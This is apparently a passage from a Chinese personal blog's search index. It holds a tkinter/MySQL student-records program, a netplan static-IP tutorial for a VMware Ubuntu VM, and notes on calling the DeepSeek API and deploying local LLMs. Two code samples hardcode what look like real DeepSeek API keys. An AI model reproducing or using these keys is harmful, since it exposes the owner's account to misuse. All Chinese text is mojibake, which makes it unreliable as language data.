class="string">&quot;&quot;&quot;æŸ¥è¯¢å­¦ç”Ÿæˆç»©æ’å&quot;&quot;&quot;</span></span><br><span class="line">        sdept = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get()</span><br><span class="line">        cno = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                SELECT student.sno, student.sname, sc.grade </span></span><br><span class="line"><span class="string">                FROM sc </span></span><br><span class="line"><span class="string">                JOIN student ON sc.sno = student.sno </span></span><br><span class="line"><span class="string">                WHERE student.sdept = %s AND sc.cno = %s </span></span><br><span class="line"><span class="string">                ORDER BY sc.grade DESC;</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span></span><br><span class="line">                cursor.execute(sql, (sdept, cno))</span><br><span class="line">                results = cursor.fetchall()</span><br><span class="line">                <span class="variable language_">self</span>.result_text.delete(<span class="number">1.0</span>, tk.END)</span><br><span class="line">                <span class="keyword">if</span> results:</span><br><span class="line">                    <span class="keyword">for</span> rank, (sno, sname, grade) <span class="keyword">in</span> <span class="built_in">enumerate</span>(results, start=<span class="number">1</span>):</span><br><span class="line">                        <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">f&quot;ç¬¬<span class="subst">&#123;rank&#125;</span>å: <span class="subst">&#123;sno&#125;</span> <span class="subst">&#123;sname&#125;</span> æˆç»©: <span class="subst">&#123;grade&#125;</span>\n&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">&quot;æ— æ•°æ®&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æŸ¥è¯¢å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SubWindow6</span>(tk.Toplevel):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, master, connection</span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__(master)</span><br><span class="line">        <span class="variable language_">self</span>.title(<span class="string">&quot;æŸ¥è¯¢å­¦ç”Ÿä¿¡æ¯&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.geometry(<span class="string">&quot;450x635+900+50&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.connection = connection</span><br><span class="line"></span><br><span class="line">        <span class="comment"># èƒŒæ™¯å›¾è®¾ç½®</span></span><br><span class="line">        bg_image = PhotoImage(file=<span class="string">&quot;bg_image.png&quot;</span>)</span><br><span class="line">        background_label = Label(<span class="variable language_">self</span>, image=bg_image)</span><br><span class="line">        background_label.place(relwidth=<span class="number">1</span>, relheight=<span class="number">1</span>)</span><br><span class="line">        background_label.image = bg_image  <span class="comment"># é˜²æ­¢å›¾ç‰‡è¢«å›æ”¶</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¾“å…¥å­—æ®µå’Œæ ‡ç­¾æ¡†æ¶</span></span><br><span class="line">        input_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        input_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.4</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å­—æ®µåå’Œè¾“å…¥æ¡†</span></span><br><span class="line">        fields = [<span class="string">&quot;å­¦å·:&quot;</span>, <span class="string">&quot;å§“å:&quot;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.entries = []</span><br><span class="line">        <span class="keyword">for</span> i, field <span class="keyword">in</span> <span class="built_in">enumerate</span>(fields):</span><br><span class="line">            label = tk.Label(input_frame, text=field, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&#x27;white&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>)</span><br><span class="line">            label.grid(row=i, column=<span class="number">0</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;e&quot;</span>)</span><br><span class="line">            entry = tk.Entry(input_frame, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bd=<span class="number">3</span>, bg=<span class="string">&#x27;lightyellow&#x27;</span>, fg=<span class="string">&#x27;Black&#x27;</span>, width=<span class="number">25</span>)</span><br><span class="line">            entry.grid(row=i, column=<span class="number">1</span>, padx=<span class="number">10</span>, pady=<span class="number">15</span>, sticky=<span class="string">&quot;w&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.entries.append(entry)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŸ¥è¯¢æŒ‰é’®æ¡†æ¶</span></span><br><span class="line">        button_frame = Frame(<span class="variable language_">self</span>, bg=<span class="string">&quot;white&quot;</span>)</span><br><span class="line">        button_frame.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.85</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŸ¥è¯¢æŒ‰é’®</span></span><br><span class="line">        search_button = tk.Button(</span><br><span class="line">            button_frame, text=<span class="string">&quot;æŸ¥è¯¢å­¦ç”Ÿä¿¡æ¯&quot;</span>, command=<span class="variable language_">self</span>.query_student_info, font=(<span class="string">&#x27;å®‹ä½“&#x27;</span>, <span class="string">&#x27;14&#x27;</span>),</span><br><span class="line">            bg=<span class="string">&#x27;lightblue&#x27;</span>, fg=<span class="string">&#x27;White&#x27;</span>, bd=<span class="number">6</span>, activeforeground=<span class="string">&quot;SpringGreen&quot;</span>, activebackground=<span class="string">&quot;Wheat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        search_button.grid(row=<span class="number">0</span>, column=<span class="number">0</span>, padx=<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># æŸ¥è¯¢ç»“æœæ˜¾ç¤º</span></span><br><span class="line">        <span class="variable language_">self</span>.result_text = tk.Text(<span class="variable language_">self</span>, height=<span class="number">7</span>, width=<span class="number">37</span>, font=(<span class="string">&#x27;Times New Roman&#x27;</span>, <span class="string">&#x27;12&#x27;</span>), bg=<span class="string">&quot;lightyellow&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.result_text.place(relx=<span class="number">0.5</span>, rely=<span class="number">0.6</span>, anchor=<span class="string">&quot;center&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">query_student_info</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;æŸ¥è¯¢å­¦ç”Ÿä¿¡æ¯&quot;&quot;&quot;</span></span><br><span class="line">        sno = <span class="variable language_">self</span>.entries[<span class="number">0</span>].get().strip()</span><br><span class="line">        sname = <span class="variable language_">self</span>.entries[<span class="number">1</span>].get().strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="variable language_">self</span>.connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">                <span class="keyword">if</span> sno:</span><br><span class="line">                    <span class="comment"># æŸ¥è¯¢å­¦ç”ŸåŸºæœ¬ä¿¡æ¯</span></span><br><span class="line">                    sql = <span class="string">&quot;SELECT * FROM Student WHERE sno = %s&quot;</span></span><br><span class="line">                    cursor.execute(sql, (sno,))</span><br><span class="line">                <span class="keyword">elif</span> sname:</span><br><span class="line">                    <span class="comment"># æŸ¥è¯¢å­¦ç”ŸåŸºæœ¬ä¿¡æ¯</span></span><br><span class="line">                    sql = <span class="string">&quot;SELECT * FROM Student WHERE sname = %s&quot;</span></span><br><span class="line">                    cursor.execute(sql, (sname,))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">&quot;è¯·è¾“å…¥å­¦å·æˆ–å§“åè¿›è¡ŒæŸ¥è¯¢ã€‚\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">                student_info = cursor.fetchone()</span><br><span class="line">                <span class="variable language_">self</span>.result_text.delete(<span class="number">1.0</span>, tk.END)</span><br><span class="line">                <span class="keyword">if</span> student_info:</span><br><span class="line">                    sno, sname, ssex, sage, sdept, scholarship = student_info</span><br><span class="line">                    <span class="variable language_">self</span>.result_text.insert(</span><br><span class="line">                        tk.END,</span><br><span class="line">                        <span class="string">f&quot;å­¦å·: <span class="subst">&#123;sno&#125;</span>\nå§“å: <span class="subst">&#123;sname&#125;</span>\næ€§åˆ«: <span class="subst">&#123;ssex&#125;</span>\nå¹´é¾„: <span class="subst">&#123;sage&#125;</span>\nç³»åˆ«: <span class="subst">&#123;sdept&#125;</span>\nå¥–å­¦é‡‘:<span class="subst">&#123;scholarship&#125;</span>\n&quot;</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="comment"># æŸ¥è¯¢é€‰è¯¾ä¿¡æ¯</span></span><br><span class="line">                    course_sql = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">                        SELECT c.cname </span></span><br><span class="line"><span class="string">                        FROM SC sc</span></span><br><span class="line"><span class="string">                        JOIN Course c ON sc.cno = c.cno</span></span><br><span class="line"><span class="string">                        WHERE sc.sno = %s</span></span><br><span class="line"><span class="string">                    &quot;&quot;&quot;</span></span><br><span class="line">                    cursor.execute(course_sql, (sno,))</span><br><span class="line">                    courses = cursor.fetchall()</span><br><span class="line">                    <span class="keyword">if</span> courses:</span><br><span class="line">                        <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">&quot;é€‰è¯¾ä¿¡æ¯:&quot;</span>)</span><br><span class="line">                        <span class="keyword">for</span> course <span class="keyword">in</span> courses:</span><br><span class="line">                            <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">f&quot;- <span class="subst">&#123;course[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">&quot;æ— é€‰è¯¾ä¿¡æ¯ã€‚\n&quot;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.result_text.insert(tk.END, <span class="string">&quot;æ— åŒ¹é…çš„å­¦ç”Ÿä¿¡æ¯ã€‚\n&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> pymysql.MySQLError <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;é”™è¯¯&quot;</span>, <span class="string">f&quot;æŸ¥è¯¢å¤±è´¥: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿è¡Œåº”ç”¨</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app = MainApplication()</span><br><span class="line">    app.mainloop()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Course </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšç¬”</title>
      <link href="/2024/10/20/note/"/>
      <url>/2024/10/20/note/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/life/note.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›ºå®šè™šæ‹Ÿæœºipåœ°å€</title>
      <link href="/2024/10/19/netset/"/>
      <url>/2024/10/19/netset/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>ä½¿ç”¨xshellè¿œç¨‹è¿æ¥è™šæ‹Ÿæœºæ—¶å‘ç°ipåœ°å€æ—¶å¸¸å‘ç”Ÿå˜åŒ–ï¼Œä¸ºäº†ç®€ä¾¿é…ç½®ï¼Œæ•…è€ƒè™‘å°†ipåœ°å€å›ºå®šä¸‹æ¥ã€‚æœ¬æ–‡æä¾›äº†ä¸¤ç§æ–¹æ³•ï¼Œåˆ†åˆ«å¯¹åº”Ubuntuç³»ç»Ÿå’ŒCentOSç³»ç»Ÿ</p><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>ä¸è®ºæ˜¯Ubuntuç³»ç»Ÿè¿˜æ˜¯CentOSç³»ç»Ÿï¼Œä»¥ä¸‹æ“ä½œå‡é€‚ç”¨</p><ul><li><p>æ‰“å¼€VMware Workstation,ç‚¹å‡»å·¦ä¸Šè§’ <strong>ç¼–è¾‘(E)</strong> -&gt; <strong>è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨(N)</strong><br><img src="/img/linux/netset-1.png"></p></li><li><p>ç‚¹å‡»æ›´æ”¹è®¾ç½®ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨<br><img src="/img/linux/netset-2.png"></p></li><li><p>é€‰æ‹© <strong>VMnet8</strong>ï¼ŒæŒ‰å›¾ç¤ºæ“ä½œ<br><img src="/img/linux/netset-3.png"></p></li><li><p>ç‚¹å‡» <strong>NATè®¾ç½®</strong><br><img src="/img/linux/netset-4.png"></p></li></ul><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a><strong>Ubuntu</strong></h3><ul><li>ubuntu 20.04</li><li>é€šè¿‡natè®¾ç½®é™æ€ip</li></ul><h4 id="1-ä¿®æ”¹æ–‡ä»¶é…ç½®"><a href="#1-ä¿®æ”¹æ–‡ä»¶é…ç½®" class="headerlink" title="1. ä¿®æ”¹æ–‡ä»¶é…ç½®"></a>1. ä¿®æ”¹æ–‡ä»¶é…ç½®</h4><p>å¤åˆ¶ä»¥ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/netplan</span><br></pre></td></tr></table></figure><p>è¿›å…¥netplanæ–‡ä»¶å¤¹ä¸‹æ‰§è¡Œ<code>ls</code>å‘½ä»¤æŸ¥çœ‹å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶<br><strong>è¿™é‡Œå¯èƒ½ä¼šæœ‰æ‰€ä¸åŒ</strong>ï¼Œç¬”è€…æ‰§è¡Œ<code>ls</code>å‘½ä»¤åæ˜¾ç¤ºå½“å‰æ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ª<code>01-network-manager-all.yaml</code>æ–‡ä»¶ï¼Œä½¿ç”¨vimä¿®æ”¹è¯¥æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim 01-network-manager-all.yaml</span><br></pre></td></tr></table></figure><p>å°†ä»¥ä¸‹ä»£ç å¤åˆ¶åˆ°<code>01-network-manager-all.yaml</code>æ–‡ä»¶å†…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Let NetworkManager manage all devices on this system</span><br><span class="line"></span><br><span class="line">network:</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.226.130/24]  # è¿™é‡Œæ˜¯ä½ è¦å›ºå®šçš„ipåœ°å€å’Œæ©ç </span><br><span class="line">      dhcp4: no</span><br><span class="line">      optional: true</span><br><span class="line">      gateway4: 192.168.226.2       # è¿™æ˜¯ç½‘å…³åœ°å€</span><br><span class="line">      nameservers:</span><br><span class="line">         addresses: [8.8.8.8,8.8.4.4] </span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd </span><br></pre></td></tr></table></figure><p><img src="/img/linux/netset-5.png"><br><strong>æ³¨æ„:</strong> è¿™é‡Œçš„ <strong>addresses</strong> è¯·å‚è€ƒå‡†å¤‡å·¥ä½œé˜¶æ®µä½ è‡ªå·±çš„ipåœ°å€, <strong>gateway4</strong>è¯·å‚è€ƒä½ è‡ªå·±åœ°ç½‘å…³åœ°å€ï¼Œ<strong>ä¿å­˜</strong>æ–‡ä»¶åé€€å‡º</p><h4 id="2-è®©é…ç½®ç”Ÿæ•ˆ"><a href="#2-è®©é…ç½®ç”Ÿæ•ˆ" class="headerlink" title="2. è®©é…ç½®ç”Ÿæ•ˆ"></a>2. è®©é…ç½®ç”Ÿæ•ˆ</h4><p>  è¾“å…¥ä¸‹é¢å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netplan apply</span><br></pre></td></tr></table></figure><h4 id="3-æ£€éªŒæ˜¯å¦æˆåŠŸ"><a href="#3-æ£€éªŒæ˜¯å¦æˆåŠŸ" class="headerlink" title="3. æ£€éªŒæ˜¯å¦æˆåŠŸ"></a>3. æ£€éªŒæ˜¯å¦æˆåŠŸ</h4><p>æ‰“å¼€Terminel,æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>ç¬”è€…ä»¥<code>192.168.226.130</code>ä¸ºå›ºå®šIPï¼Œè‹¥æ˜¾ç¤ºå¦‚ä¸‹åˆ™é…ç½®æˆåŠŸ<br><img src="/img/linux/netset-6.png"></p><h3 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a><strong>CentOS</strong></h3><p>è¯¦ç»†æ–¹æ³•å¯å‚è€ƒ<a href="https://www.bilibili.com/video/BV1n84y1i7td?spm_id_from=333.788.videopod.episodes&vd_source=1046cf6b20b652e0071d6a870e3b9fdb&p=6">è¯¥è§†é¢‘</a></p>]]></content>
      
      
      <categories>
          
          <category> Interest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤§æ¨¡å‹éƒ¨ç½²å·¥ä½œæ€»ç»“</title>
      <link href="/2024/10/15/Bigmodels/"/>
      <url>/2024/10/15/Bigmodels/</url>
      
        <content type="html"><![CDATA[<h2 id="æŠ€æœ¯è·¯çº¿"><a href="#æŠ€æœ¯è·¯çº¿" class="headerlink" title="æŠ€æœ¯è·¯çº¿"></a>æŠ€æœ¯è·¯çº¿</h2><p>å‰æœŸè°ƒç ”æ™ºèƒ½ç­”ç–‘ç³»ç»Ÿå®ç°çš„æŠ€æœ¯è·¯çº¿ï¼Œæå‡ºä¸¤ç§è§£å†³æ–¹æ¡ˆï¼Œä¸€ç§æ˜¯ç›´æ¥è°ƒç”¨APIï¼Œä¸€ç§æ˜¯æœ¬åœ°éƒ¨ç½²å¤§æ¨¡å‹<br><img src="/img/AI_project/models/routine.png"></p><h3 id="è°ƒç”¨APIæ–¹å¼"><a href="#è°ƒç”¨APIæ–¹å¼" class="headerlink" title="è°ƒç”¨APIæ–¹å¼"></a>è°ƒç”¨APIæ–¹å¼</h3><ol><li>deepseek<br>å¯ä»¥åœ¨<a href="https://www.deepseek.com/">deepseekå®˜ç½‘</a>ä¸Šç”³è¯·å…è´¹çš„API_Key<br>ç¯å¢ƒè¦æ±‚ï¼š<br>python&gt;&#x3D;3.10<br><strong>å»ºè®®</strong>åœ¨Anacondaå†…åˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œé¿å…ä¸åŒåº“ä¹‹é—´çš„å†²çª<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n è™šæ‹Ÿç¯å¢ƒåç§° python=3.10 </span><br><span class="line">conda activate è™šæ‹Ÿç¯å¢ƒåç§°  </span><br></pre></td></tr></table></figure>ä½¿ç”¨æ–¹æ³•ï¼š<br>I å®‰è£…ç›¸å…³ä¾èµ–<br>pip install openai<br>II è°ƒç”¨API<br>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„pythonç¨‹åº</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(api_key=<span class="string">&quot;sk-8b6ffa84471e4539b364df3d5af7fdc6&quot;</span>, base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>) <span class="comment"># åœ¨deepseekå®˜ç½‘ç”³è¯·å…è´¹çš„API</span></span><br><span class="line"></span><br><span class="line">response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;ä»€ä¹ˆæ˜¯SQLæ³¨å…¥&quot;</span>&#125;,  <span class="comment"># åœ¨contentä¸­ä¿®æ”¹ä½ çš„é—®é¢˜</span></span><br><span class="line">    ],</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.choices[<span class="number">0</span>].message.content)</span><br></pre></td></tr></table></figure><p>ä»¥ä¸‹æ˜¯ç”±cpæä¾›çš„æ›´å‹å¥½çš„äº¤äº’æ–¹å¼çš„pythonç¨‹åº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">day = datetime.datetime.now().strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>) + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">t = datetime.datetime.now().strftime(<span class="string">&quot;%H-%M-%S&quot;</span>)</span><br><span class="line">logfile = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, day), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">logfile.write(t + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">logfile.write(<span class="string">&quot;Chat Start\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://api.deepseek.com&quot;</span></span><br><span class="line">api_key = <span class="string">&quot;sk-6447d4602e0e471093715cff77ffa585&quot;</span></span><br><span class="line">client = OpenAI(api_key=api_key, base_url=url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    user_message = <span class="built_in">input</span>(<span class="string">&quot;User: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user_message == <span class="string">&quot;Q&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;System: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    message=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: user_message&#125;,</span><br><span class="line">    ]</span><br><span class="line">    model = <span class="string">&quot;deepseek-chat&quot;</span>  <span class="comment"># deepseek-chat, deepseek-coder</span></span><br><span class="line">    response = client.chat.completions.create(model=model,messages=message,stream=<span class="literal">False</span>)</span><br><span class="line">    logfile.write(<span class="string">&quot;User: &quot;</span> + user_message + <span class="string">&#x27;\n&#x27;</span> + <span class="string">&quot;System: &quot;</span> + response.choices[<span class="number">0</span>].message.content + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> response.choices[<span class="number">0</span>].message.content:</span><br><span class="line">        <span class="built_in">print</span>(i, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.02</span>)</span><br><span class="line">    <span class="comment"># print(response.choices[0].message.content)</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">logfile.write(<span class="string">&quot;Chat Over\n\n&quot;</span>)</span><br><span class="line">logfile.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Chat Over&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>openai_key<br>åœ¨<a href="https://openai.com/">penaiå®˜ç½‘</a>è·å–<br> éœ€è¦ä¸€ç‚¹<strong>æŠ€æœ¯å’Œæ‰‹æ®µ</strong>ï¼Œä½¿ç”¨æ–¹æ³•è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£</li></ol><h3 id="æœ¬åœ°éƒ¨ç½²å¤§æ¨¡å‹"><a href="#æœ¬åœ°éƒ¨ç½²å¤§æ¨¡å‹" class="headerlink" title="æœ¬åœ°éƒ¨ç½²å¤§æ¨¡å‹"></a>æœ¬åœ°éƒ¨ç½²å¤§æ¨¡å‹</h3><p>åœ¨æ¨¡å‹é€‰æ‹©ä¸Šï¼Œæˆ‘ä»¬ä¸»è¦è°ƒç ”äº†ç”±æ¸…åå¤§å­¦å¼€æºçš„ChatGLM-8bå¤§æ¨¡å‹å’Œç”±Metaå¼€å‘çš„LLama3</p><ol><li><strong>æ¨¡å‹ä»‹ç»</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>ç”± Metaï¼ˆå‰ Facebookï¼‰å¼€å‘ã€‚</li><li>LLaMAï¼ˆLarge Language Model Meta AIï¼‰çš„ç›®æ ‡æ˜¯æä¾›é«˜æ•ˆçš„ã€å¯æ‰©å±•çš„å¤§å‹è¯­è¨€æ¨¡å‹ï¼Œå¹¶åœ¨å­¦æœ¯ç ”ç©¶å’Œå·¥ä¸šåº”ç”¨ä¸­å¾—åˆ°å¹¿æ³›åº”ç”¨ã€‚</li><li>Meta æ¨å‡ºäº†å¤šä¸ªç‰ˆæœ¬ï¼ŒåŒ…æ‹¬ LLaMA 1ã€LLaMA 2ï¼Œé¢„è®¡ LLaMA 3 ä¼šåœ¨è¿™äº›åŸºç¡€ä¸Šè¿›ä¸€æ­¥æ”¹è¿›ã€‚</li><li>LLaMA ç³»åˆ—æ¨¡å‹ä¸“æ³¨äºå¼€æ”¾çš„ã€å¤šä»»åŠ¡å¤„ç†èƒ½åŠ›ï¼Œé€‚åˆäºå¤šç§ä¸‹æ¸¸ä»»åŠ¡ï¼Œå¦‚æ–‡æœ¬ç”Ÿæˆã€ç¿»è¯‘ã€å¯¹è¯ã€ä»£ç ç”Ÿæˆç­‰ã€‚</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ç”±æ¸…åå¤§å­¦ KEG å®éªŒå®¤å’Œ Zhipu.AI è”åˆå¼€å‘çš„ä¸­æ–‡-è‹±æ–‡åŒè¯­è¯­è¨€æ¨¡å‹ã€‚</li><li>ChatGLM 